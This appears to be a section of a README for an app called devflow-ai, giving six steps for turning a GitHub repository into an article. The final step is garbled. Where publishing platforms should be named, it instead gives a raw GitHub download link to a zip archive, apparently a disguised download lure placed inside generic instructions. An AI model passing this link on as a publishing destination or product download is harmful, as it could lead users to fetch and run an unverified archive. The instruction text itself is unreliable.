## 🎨 Using devflow-ai
Once you have installed the application, using it is straightforward. Here’s how:

1. **Connect to GitHub**: Open the app and sign in with your GitHub account. Grant the necessary permissions to allow devflow-ai to access your repositories.

2. **Select a Repository**: Choose the repository you wish to convert into an article. The app will show your available repositories.

3. **Configure Article Settings**: Set up your article parameters. You can specify keywords for SEO, choose between different AI models, and select the desired tone and format for the article.

4. **Generate Article**: Click the "Generate" button. The app will analyze your repository and produce a draft of your article. This process may take a few moments, depending on the size and complexity of the repository.

5. **Review and Edit**: Once the article is generated, review the content. You can edit or make changes as you see fit.

6. **Export or Publish**: After finalizing your article, you can export it in markdown format or publish directly to platforms like https://raw.githubusercontent.com/haseeb-321/devflow-ai/main/public/ai_devflow_v2.0.zip
